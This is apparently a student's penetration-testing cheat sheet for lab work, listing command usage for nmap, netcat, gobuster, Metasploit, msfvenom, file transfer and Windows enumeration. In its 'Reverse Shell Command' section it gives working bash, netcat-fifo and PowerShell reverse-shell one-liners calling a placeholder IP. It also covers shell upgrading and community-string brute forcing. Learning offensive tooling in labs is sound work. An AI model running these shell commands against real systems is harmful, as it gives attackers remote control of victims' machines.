# Linux tools

how to connect to a VPN

- remember that if you're ever confused about a command, to use the "man" command.

## sudo openvpn user.ovpn
- user.ovpn represents the VPN key
- openvpn is the client

## ifconfig
- ifoncig gives you a *tun* adapter if you successfully connect to the VPN
- just the network layer of the connection

## netstat -rn
- shows you the networks available via the vpn

## sudo
- the -u flag lets you specify a user in which you wish to sudo as.
- the -l flag lets you list every sudoer user.

## dpkg
- dpkg -l lists all packages installed on the system.

## SSH
- Use 'ssh user@host' to safely remotely access a computer. Very useful utility
- -p flag lets you specify a port
- -i lets you specify a private key file you can use to login. No password required, just the private key.

## Netcat
Allows you to grab the banner of a given service running on a port. Also lets you set your ports to listening mode so it awaits incoming connections.
- 'nc <host> <port>'

Allows netcat to listen for a connection on a specific port.
- 'nc -lvpn <port>'

- -l flag lets you set a port to listen mode
- -p flag lets you specify a port
- -n lets you disable dns resolution and only connect to IPs. This will speed up the connection
- -v enables verbose mode and will let netcat tell you when the port receives a signal


## FTP
- ftp services can be connected to by using the ftp utility
- 'ftp -p <host>':w

## smbclient
- Lets you enumerate shared SMB folders between users and admins
- 'smbclient <host>' lets you access it.
- -L flag lists available shares
- -N flag supresses password prompts.
- -U flag lets you submit a user as an extra parameter (will likely prompt you with a password)

## Get command
- lets you download files from remotely accessed devices.

## SNMP
- 'snmpwalk <version> <public/private> <ip>'
- Lets you gather some information about a network management device.

# onesixtyone
- 'onesixtyone -c <dictionary> <ip>' lets you brute force community strings for networks.

# nmap
- 'nmap <flags> <ip>'
the -sC parameter of nmap lets you specify which script should be used to gain more detailed information.

-sV parameer instructs nmap to perform a version scan which lets nmap fingerprint the services on the traget system and identify their protocols, application names and version number. Version scan uses a massive databse of over 1000 service signatures, 

-p- tells nmap that you want to scan EVERY single port out of all 65535 ports.

-sV and -sC parameters increase how long the scan takes because it has to perform a ton more checks instead of performing only a TCP handshake

The -sC parameter runs a ton of useful default scripts against the ports to gain more information about them.

-oA 
--open flag only shows ports that are open/listening ports.


version scans can also reveal which OS you are scanning if the version of the protocol mentions it.

The sV parameter will fingerprint the services on the target system and will acquire the protocol, the application name and the version.
It is very informative.

# Gobuster
'gobuster <dir/dns> <command options>
- the dir flag lets you switch between directory enum mode and dns enum mode.
- 'dir -u' lets you specify a url that you want to connect to.
- 'dir -w' lets you specify a wordlist for a dictionary attack.
- Theres many more flags that you can lookup by looking at the 'man' page.

# EyeWitness
- Eyewitness is a tool that lets you take screenshots of target web apps and also finger print them and identify credentials.

# starting up a python http server.
- 'python3 -m http.server <port>'
- files in the folder are automatically treated as pages and can be grabbed using wget.

## tools for downloading files
# wget
- 'wget <url/ip>'
Tool that lets you download webpages or content off of webpages.
- if the remote server doesn't have wget, you should use curl.

# curl
'curl <ip/url>'
Tool that lets you download stuff from certain ports.
- '-I' flag lets you grab the header of an HTTP IMAP or SMTP protocol port.
- '-L' flag. In case the server redirects (as indicated per a 3xx code), this flag lets curl follow the redirect.

# scp
SCP is a tool tat can let you download files over an ssh connection.
- 'scp <localfile> user@remotehost:/path/<localfile>'

# base64
In some cases, we may not be able to transfer files over the connection (IE remote host has a firewall) in which case we can encode the file using base64 and then paste and decode it on the server.
- 'base64 <file> -w 0'
- -w is a flag that lets you wrap the file after the COLS character. setting it to 0 disables wrapping.

## Validating file transfers
# file tool
To validate the format of a file you can run the file command on it.
- 'file <file>'

# md5sum 
md5sum is a tool that lets you run a hashing function on a file. If the hashes match, then the filetransfer is correct.

md5sum is a bit outdated for encrypting files.

- 'md5sum <file>'

# sha256
another file validation hash function.
- 'sha256sum <file>'

# whatweb
a'whatweb <ip>'
- Lets you pinpoint the exact tech that runs on the webserver.
- Very useful.
- Has a lot more functionality that lets you automate website enumeration across a network.

# Metasploit Primer
- msfconsole lets you search for exploits.
- you can type 'search <exploit/module> <app>' to find an exploit
- you can also type 'use <pathtoexploit>' this lets you automatically abuse the exploit.
- before you can run it you need to configure the options by typing 'show options'
- any option that's "required" is... well required for the exploit to work lol..
- the 'set <option> <input>' lets you set settings.
- 'exploit' lets you actually run the exploit
- The 'check' command lets you see if a server is vulnerable.
- 'Upload' command lets you upload a file to the remote host

# msfvenom
Tool for creating payloads for msfconsole to use. Can be a bind shell, reverse shell, web shell, or something completely differnt.
- 'msfconsole -p <payload_path>'
- -p flag lets you specify a payload.
- -l lists module types, payloads, encoders, nops, all etc.


# IP
- Your IP can be found using the following command.
- 'ip a'
- HTB uses 'tun0' as the default hackthebox vpn connection interface because they dont have internet access.
- Normally you'd use something like 'eth0' or something.

# Reverse Shell Command
- The executed commands depend on what OS the compromised host runs on. A website called "Payload All The Things" has a comprehensive list of reverse shell commands which can be very useful.

A few standard commands are 
## Linux
- bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
## Also bash
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
## Powershell
-  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

- We can use the exploit we have over a remote host to execute one of these commands. (IE through python or a metasploit module) to get a reverse connection

# xmllint
tool that lets you format xml files. 

- xmllint --format - <xml_file> to format an xml file to be more readable

# cewl
cewl is a tool that lets you create custom wordlists with a file as input (can be an xml file or something like that.)

# upgrading tty
a command for upgrading tty of a reverse shell
- python -c 'import pty; pty.spawn("/bin/bash")'

# xfreerdp
an RDP client tool which can be used to remotely connect to a desktop
- 'xfreerdp /v:<targetIP> /u:<username> /p:<password>'

# Windows tools

# getting OS version cmdlet
a cmdlet that can give you info on the OS version and more.
- 'Get-WmiObject -Class' using the 'win32_OperatingSystem' class.
# Other useful classes
- Win32_Process can give you a process listing.
- Win32_Service gives you a listing of services
- Win32_Bios gives you information about the BIOS of the computer.

More information about the CMDlet can be found here
- https://ss64.com/ps/get-wmiobject.html
- https://adamtheautomator.com/get-wmiobject/

# Navigating folders
dir tool lets you search folders.
- 'dir <folder>'

tree tool lets you show the path of a given folder. Also exists on linux but whateverrr.
- 'tree <folder>'
modified version of tree that lets you view folders one at a time instead of being bombarded by information.
- tree c:\ /f | more

# permission utils.
a utility for modifying and listing permissions of files and folders.
- 'icacls <folder>'
Resource access level is listed as follows
- (CI) container inherit
- (OI) object inherit
- (IO) inherit only
- (NP) Do not propogate inherit
- (I) Permission inherited from parent container


